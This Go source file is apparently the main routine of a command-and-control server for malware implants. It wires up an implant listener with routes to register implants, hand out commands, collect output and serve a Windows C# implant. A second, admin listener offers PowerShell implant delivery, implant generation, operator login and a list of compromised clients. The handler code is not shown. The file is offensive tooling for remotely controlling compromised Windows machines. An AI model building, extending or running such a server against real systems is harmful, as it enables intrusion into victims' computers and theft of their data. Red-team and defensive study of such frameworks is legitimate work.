package main

import (
	"database/sql"
	"fmt"
	"log"
	"net/http"

	_ "github.com/go-sql-driver/mysql"
)

var (
	db     *sql.DB
	config []Configuration
)

func main() {
	config, err1 := LoadConfiguration("aef-profile.json")
	if err1 != nil {
		fmt.Println(err1)
		return
	}

	user := config[0].Server[0].SQLUser
	pass := config[0].Server[0].SQLPass

	var err error
	db, err = sql.Open("mysql", user+":"+pass+"@tcp(127.0.0.1:3306)/aef")
	if err != nil {
		panic(err)
	}

	// First server config
	serverIP1 := config[0].Server[0].IP
	serverPort1 := config[0].Server[0].Port
	var socket1 = serverIP1 + ":" + serverPort1

	// Second server config
	serverIP2 := config[0].Server[1].IP
	serverPort2 := config[0].Server[1].Port
	var socket2 = serverIP2 + ":" + serverPort2

	// Mux for server1
	mux1 := http.NewServeMux()
	mux1.HandleFunc("/registerNewImplant", registerNewImplant)
	mux1.HandleFunc("/fetchCommand", fetchCommand)
	mux1.HandleFunc("/fetchOutput", fetchOutput)
	mux1.HandleFunc("/agents/windows/cs", windowsImplant)

	// Mux for server2
	mux2 := http.NewServeMux()
	mux2.HandleFunc("/agents/windows/powershell", powerShellImplant)
	mux2.HandleFunc("/generate/windows/implant", generateImplant)
	mux2.HandleFunc("/getStoredOutput", getStoredOutput)
	mux2.HandleFunc("/operators/register", registerOperatorHandler)
	mux2.HandleFunc("/operators/login", loginOperatorHandler)
	mux2.HandleFunc("/getClients", getClients)

	go func() {
		fmt.Println("Implant Server: " + socket1)
		err := http.ListenAndServe(socket1, mux1)
		if err != nil {
			log.Fatal("ListenAndServe for socket1: ", err)
		}
	}()

	fmt.Println("Admin Server: " + socket2)
	err = http.ListenAndServe(socket2, mux2)
	if err != nil {
		log.Fatal("ListenAndServe for socket2: ", err)
	}
}
